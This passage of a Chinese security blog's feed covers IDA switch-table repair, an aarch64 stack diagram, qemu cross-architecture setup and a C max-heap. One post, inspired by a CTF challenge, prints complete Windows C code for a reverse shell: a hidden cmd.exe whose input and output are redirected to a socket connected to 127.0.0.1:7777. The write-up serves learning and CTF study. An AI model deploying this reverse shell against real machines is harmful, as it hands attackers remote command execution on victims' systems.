class="number">00000000000011</span>D1                 lea     rdx, ds:<span class="number">0</span>[rax*<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">00000000000011</span>D9                 lea     rax, jump_table</span><br><span class="line">.text:<span class="number">00000000000011E0</span>                 mov     eax, [rdx+rax]</span><br><span class="line">.text:<span class="number">00000000000011E3</span>                 cdqe</span><br><span class="line">.text:<span class="number">00000000000011E5</span>                 lea     rdx, jump_table</span><br><span class="line">.text:<span class="number">00000000000011</span>EC                 add     rax, rdx</span><br><span class="line">.text:<span class="number">00000000000011</span>EF                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">00000000000011</span>EF                 jmp     rax</span><br></pre></td></tr></table></figure><p>把输入的a 乘4 计算出 offset 在 jump_table中的偏移 , 然后把jump_table的地址当作base,加上对应的offset 放到rax，然后jmp rax</p><p>知道的原理之后，我们可以知道，要计算出目标地址，需要进行下面的操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TargetAddr = jmp_table.addr  +  jmp_table[idx]</span><br></pre></td></tr></table></figure><p>也就是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TargetAddr = jmp_table.addr  +  *(jmp_table + <span class="keyword">sizeof</span>(jmp_table[<span class="number">0</span>]) * idx) </span><br></pre></td></tr></table></figure><p>看一下IDA里面，11c3是switch开始的部分: </p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled.png" alt="Untitled"></p><p>jmp_table在这里:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%201.png" alt="Untitled"></p><p>点击 IDA:edit→other→Specify switch idiom…，看到下面的界面</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%202.png" alt="Untitled"></p><p>对照前面说的，把需要的信息填上去就行</p><ol><li>Address of jump table: jump table的起始位置</li><li>Number of Elements: 数组元素个数</li><li>Size of elements: 每个元素的大小</li><li>Element base value: offset ，也就是每个元素要加的base，从汇编代码可以看出来就是jump table的地址</li><li>Start of the switch idiom: switch开始的地方</li><li>Input register of switch : 被当作idx的寄存器</li></ol><p>…….</p><p>填完之后点击确定，然后F5，我们会发现生成的C语言代码并不是向我们想象的那样:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%203.png" alt="Untitled"></p><p>大家仔细观察就会发现，除了最高位的1，都是正确的，这是因为IDA把jmp table中的每个element 当作了无符号数，只需要在这里打上勾就行:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%204.png" alt="Untitled"></p><p>然后就能看到想要的结果了:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%205.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDA-switch语句修复&quot;&gt;&lt;a href=&quot;#IDA-switch语句修复&quot; class=&quot;headerlink&quot; title=&quot;IDA switch语句修复&quot;&gt;&lt;/a&gt;IDA switch语句修复&lt;/h1&gt;&lt;p&gt;下面是一段代码&lt;/p&gt;
&lt;figure cl</summary>
      
    
    
    
    <category term="逆向" scheme="https://h4ckf0rfun.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>aarch64栈结构</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/27/aarch64%E6%A0%88%E7%BB%93%E6%9E%84/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/27/aarch64%E6%A0%88%E7%BB%93%E6%9E%84/</id>
    <published>2022-09-27T08:56:38.000Z</published>
    <updated>2022-09-27T08:57:34.887Z</updated>
    
    <content type="html"><![CDATA[<h1 id="aarch-64栈结构"><a href="#aarch-64栈结构" class="headerlink" title="aarch 64栈结构"></a>aarch 64栈结构</h1><p><img src="https://h4ckf0rfun.github.io/2022/09/27/aarch64%E6%A0%88%E7%BB%93%E6%9E%84/Untitled.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;aarch-64栈结构&quot;&gt;&lt;a href=&quot;#aarch-64栈结构&quot; class=&quot;headerlink&quot; title=&quot;aarch 64栈结构&quot;&gt;&lt;/a&gt;aarch 64栈结构&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.githu</summary>
      
    
    
    
    <category term="日记" scheme="https://h4ckf0rfun.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>windows下调用Write/ReadFile来操作socket</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/</id>
    <published>2022-09-16T12:08:46.000Z</published>
    <updated>2022-09-16T12:49:04.762Z</updated>
    
    <content type="html"><![CDATA[<p>今天比赛的时候发现了个有趣的东西:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/Untitled.png" alt="Untitled"></p><p>是一道misc的题目，里面直接把cmd 的输入输出重定向到了socket，如果在linux下面，这是毫无疑问可以的。但是windows下的话，在控制台输入输出实际是调用的Read&#x2F;WriteFile 函数，如果这个程序没有问题的话，说明Read&#x2F;WriteFile是可以对socket进行操作的。</p><p>但是我以前测试的时候，是不能的。唯一的区别就是这里用的是WSASocket，而我的是socket函数，换成WSASocket测试，果然成功了:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/Untitled%201.png" alt="Untitled"></p><p>代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> sz_addr[] = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="type">int</span> port = <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">entry</span><span class="params">()</span></span>&#123;</span><br><span class="line">WSADATA wsadata;</span><br><span class="line"><span class="type">int</span> ExitCode = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">0</span>), &amp;wsadata))&#123;</span><br><span class="line"><span class="keyword">goto</span> _error;</span><br><span class="line">&#125;</span><br><span class="line">SOCKET s = <span class="built_in">WSASocket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (s == INVALID_SOCKET)&#123;</span><br><span class="line"><span class="keyword">goto</span> _error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SOCKADDR_IN addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">addr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(sz_addr);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = <span class="built_in">htons</span>(port);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">connect</span>(s, (SOCKADDR*)&amp;addr, <span class="built_in">sizeof</span>(addr)))&#123;</span><br><span class="line"><span class="keyword">goto</span> _error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">STARTUPINFOA si = &#123; <span class="built_in">sizeof</span>(si) &#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">si.hStdError = (HANDLE)s;</span><br><span class="line">si.hStdOutput = (HANDLE)s;</span><br><span class="line">si.hStdInput = (HANDLE)s;</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line"></span><br><span class="line">si.wShowWindow = SW_HIDE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateProcessA</span>(<span class="number">0</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, TRUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))&#123;</span><br><span class="line"><span class="keyword">goto</span> _error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);</span><br><span class="line">ExitCode = <span class="number">0</span>;</span><br><span class="line">_error:</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/Untitled%202.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天比赛的时候发现了个有趣的东西:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%9</summary>
      
    
    
    
    <category term="日记" scheme="https://h4ckf0rfun.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>linux运行其他架构的程序</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/15/linux%E8%BF%90%E8%A1%8C%E5%85%B6%E4%BB%96%E6%9E%B6%E6%9E%84%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/15/linux%E8%BF%90%E8%A1%8C%E5%85%B6%E4%BB%96%E6%9E%B6%E6%9E%84%E7%9A%84%E7%A8%8B%E5%BA%8F/</id>
    <published>2022-09-15T13:38:44.000Z</published>
    <updated>2022-09-15T13:39:19.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Untitled"><a href="#Untitled" class="headerlink" title="Untitled"></a>Untitled</h1><h1 id="aarch64-运行环境"><a href="#aarch64-运行环境" class="headerlink" title="aarch64 运行环境"></a>aarch64 运行环境</h1><ol><li>安装qemu-user</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure><ol start="2"><li>安装gcc (生成aarch64架构的版本)</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h1 id="mips-运行环境"><a href="#mips-运行环境" class="headerlink" title="mips 运行环境"></a>mips 运行环境</h1><ol><li>安装qemu-user</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure><ol start="2"><li>安装gcc</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-mips-linux-<span class="built_in">gnu</span>    (大端)</span><br><span class="line">sudo apt install gcc-mipsel-linux-<span class="built_in">gnu</span>  (小端)</span><br></pre></td></tr></table></figure><p>gcc安装后头文件与.so文件所在的目录:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/xxxx-linux-gnu/</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Untitled&quot;&gt;&lt;a href=&quot;#Untitled&quot; class=&quot;headerlink&quot; title=&quot;Untitled&quot;&gt;&lt;/a&gt;Untitled&lt;/h1&gt;&lt;h1 id=&quot;aarch64-运行环境&quot;&gt;&lt;a href=&quot;#aarch64-运行环境&quot; cla</summary>
      
    
    
    
    <category term="日记" scheme="https://h4ckf0rfun.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>最大堆</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/12/%E6%9C%80%E5%A4%A7%E5%A0%86/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/12/%E6%9C%80%E5%A4%A7%E5%A0%86/</id>
    <published>2022-09-12T03:18:04.000Z</published>
    <updated>2022-09-12T03:19:45.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最大堆"><a href="#最大堆" class="headerlink" title="最大堆"></a>最大堆</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>完全二叉树，对于任意一个节点，需要满足:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Parent-&gt;val &gt;= left-&gt;val</span><br><span class="line">Parent-&gt;val &gt;= right-&gt;val</span><br></pre></td></tr></table></figure><h2 id="上浮操作与下沉操作"><a href="#上浮操作与下沉操作" class="headerlink" title="上浮操作与下沉操作"></a>上浮操作与下沉操作</h2><p>关键:上面的节点一定比下面的大. (除去要操作的节点)</p><p><img src="https://h4ckf0rfun.github.io/2022/09/12/%E6%9C%80%E5%A4%A7%E5%A0%86/Untitled.png" alt="Untitled"></p><ol><li>上浮: 新插入的节点，一开始处于最后的位置，需要上浮操作调整到合适的位置</li></ol><p>将该节点与parent比较，若大于parent，一定也比兄弟大，需要交换parent与该节点的值，由于上面的节点一定比下面的大，所以之后上面节点的调整也不会再影响到下面的节点了。</p><ol start="2"><li>下沉操作: pop时候，将root节点替换为其他值，进行下沉操作调整到合适的位置</li></ol><p>将该节点与比他大的最大的孩子交换，由于下面的节点一定比上面的节点小，所以之后下面节点的操作不会影响到上面的节点。</p><p>上浮操作可以看作是一种特殊的下沉，下沉操作也可以看作是一种特殊的上浮，只不过是终止的很快而已(上面的一定比下面的大，下面的一定比上面的小，使得终止的很快)。</p><h2 id="将任意的一颗完全二叉树转换为最大堆"><a href="#将任意的一颗完全二叉树转换为最大堆" class="headerlink" title="将任意的一颗完全二叉树转换为最大堆"></a>将任意的一颗完全二叉树转换为最大堆</h2><ol><li>(利用下沉操作) 可以这样考虑问题:</li></ol><p><img src="https://h4ckf0rfun.github.io/2022/09/12/%E6%9C%80%E5%A4%A7%E5%A0%86/Untitled%201.png" alt="Untitled"></p><p>假设这颗完全二叉树根节点的左子树和右子树已经是最大堆了，只需要进行下沉操作即可。</p><p>同样的，那么左面这个最大堆是怎么来的呢?</p><p><img src="https://h4ckf0rfun.github.io/2022/09/12/%E6%9C%80%E5%A4%A7%E5%A0%86/Untitled%202.png" alt="Untitled"></p><p>假设它的左子树和右子树(绿色的部分)已经是最大堆了，只需要进行下沉操作。</p><p>……….</p><p>我们只需要反复递推下去，再倒回来，就可以将这颗完全二叉树调整为最大堆了(递归的思想)</p><ol start="2"><li>上面调整的方法是利用下沉的操作，那么是不是也能利用上浮的操作呢?</li></ol><p>我们假设这颗完全二叉树已经是 [最大堆 + 一个节点] 的情况，接着我们利用上浮操作就能将这颗子树调整为最大堆</p><p><img src="https://h4ckf0rfun.github.io/2022/09/12/%E6%9C%80%E5%A4%A7%E5%A0%86/Untitled%203.png" alt="Untitled"></p><p>那么红色部分的这个最大堆又是怎么来的呢，我们继续假设它是 [最大堆(绿色) + 一个额外的节点(蓝色)]</p><p><img src="https://h4ckf0rfun.github.io/2022/09/12/%E6%9C%80%E5%A4%A7%E5%A0%86/Untitled%204.png" alt="Untitled"></p><p>只需要将蓝色的节点进行上浮操作，就能将红色这部分转化为一个最大堆</p><p>……..</p><p>这样反复递推下去，再倒回来，我们就能将这整颗完全二叉树转换为最大堆了！</p><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码:"></a>实现代码:</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> nodes[<span class="number">0x1000000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> t = arr[a];</span><br><span class="line">arr[a] = arr[b];</span><br><span class="line">arr[b] = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">(<span class="type">int</span> start)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (start &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> parent = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(start &amp; <span class="number">1</span>))&#123;</span><br><span class="line">parent = (start - <span class="number">2</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">parent = (start - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">if</span> (nodes[parent] &lt; nodes[start])&#123;<span class="comment">//如果比父亲大,那么一定也比兄弟大.</span></span><br><span class="line"><span class="built_in">swap</span>(nodes, parent, start);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//end.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line">start = parent;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line"><span class="comment">//插入到尾部</span></span><br><span class="line">nodes[count++] = val;</span><br><span class="line"><span class="comment">//上浮,关键:插入之前上面的一定比下面的大.</span></span><br><span class="line"><span class="built_in">up</span>(count - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> start)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//find max val of three nodes.</span></span><br><span class="line"><span class="type">int</span> max_idx = <span class="number">2</span> * start + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (max_idx + <span class="number">1</span> &lt;= count)&#123;</span><br><span class="line"><span class="keyword">if</span> (max_idx + <span class="number">1</span> &lt; count)&#123;<span class="comment">//还有另一个孩子.</span></span><br><span class="line"><span class="keyword">if</span> (nodes[max_idx] &lt; nodes[max_idx + <span class="number">1</span>])&#123;</span><br><span class="line">max_idx++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//要和最大的child 交换.</span></span><br><span class="line"><span class="keyword">if</span> (nodes[start] &lt; nodes[max_idx])&#123;</span><br><span class="line"><span class="built_in">swap</span>(nodes, start, max_idx);</span><br><span class="line">&#125;</span><br><span class="line">start = max_idx;<span class="comment">//从子树开始down.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//tail ---&gt; head.</span></span><br><span class="line"><span class="type">int</span> result = nodes[<span class="number">0</span>];</span><br><span class="line">nodes[<span class="number">0</span>] = nodes[count - <span class="number">1</span>];</span><br><span class="line">count--;</span><br><span class="line"></span><br><span class="line"><span class="built_in">down</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将一颗任意的完全二叉树转化为最大堆.</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify_by_down</span><span class="params">()</span></span>&#123;<span class="comment">//利用下沉操作进行转化</span></span><br><span class="line"><span class="keyword">if</span> (count == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> last = count - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!(last &amp; <span class="number">1</span>))&#123;</span><br><span class="line">last = (last - <span class="number">2</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">last = (last - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (;;last--)&#123;</span><br><span class="line"><span class="comment">//下沉子树的root使这颗子树变成最大堆.,反复进行此步骤。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">down</span>(last);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify_by_up</span><span class="params">()</span></span>&#123;<span class="comment">//利用上浮操作进行转化.</span></span><br><span class="line"><span class="keyword">if</span> (count == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> start = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (;; start++)&#123;</span><br><span class="line"><span class="built_in">up</span>(start);</span><br><span class="line"><span class="keyword">if</span> (start == count - <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">nodes[count++] =  <span class="built_in">rand</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">modify_by_up</span>();</span><br><span class="line"><span class="type">int</span> last = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; count &gt; <span class="number">0</span>;)&#123;</span><br><span class="line"><span class="type">int</span> val = <span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span> (last != <span class="number">-1</span> &amp;&amp; val &gt; last)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line">last = val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(可能有些细节的地方没有注意到)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;最大堆&quot;&gt;&lt;a href=&quot;#最大堆&quot; class=&quot;headerlink&quot; title=&quot;最大堆&quot;&gt;&lt;/a&gt;最大堆&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    <category term="数据结构" scheme="https://h4ckf0rfun.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>CTFd+ctfd-whale环境搭建</title>
